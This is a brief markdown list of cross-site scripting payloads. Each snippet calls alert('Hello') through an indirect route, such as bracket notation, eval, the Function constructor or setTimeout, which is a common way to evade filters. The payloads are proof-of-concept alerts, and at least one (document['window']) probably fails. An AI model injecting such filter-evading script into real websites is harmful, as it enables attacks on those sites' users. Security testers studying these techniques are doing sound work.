# XSS_Payloads2

XSS payloads

// Array Notation  
`window['alert']('Hello');`

// Chained Array Notation  
`this['window']['alert']('Hello');`

// Indirect Reference Using Call/Apply  
`(0, eval)('alert("Hello")');`

// Calling via Function Constructor  
`(new Function('alert("Hello")'))();`

// SetTimeout or SetInterval  
`setTimeout('alert("Hello")', 0);`

// Indirect Reference with call  
`window.alert.call(this, 'Hello');`

// Using bind  
`const alertBind = alert.bind(window);
alertBind('Hello');`

// anon functions  
`(() => alert('Hello'))();`

// Self-Invoking Function with alert  
`(function(){ alert('Hello'); })();`

// Function call  
`Function.prototype.call.call(alert, window, 'Hello');`

// Global this  
`(this || window).alert('Hello');`

// chaining doc and window  
`document['window']['alert']('Hello');`

// Reclusive indirect function calling  
`(((f) => f(f))((f) => alert('Hello')))();`
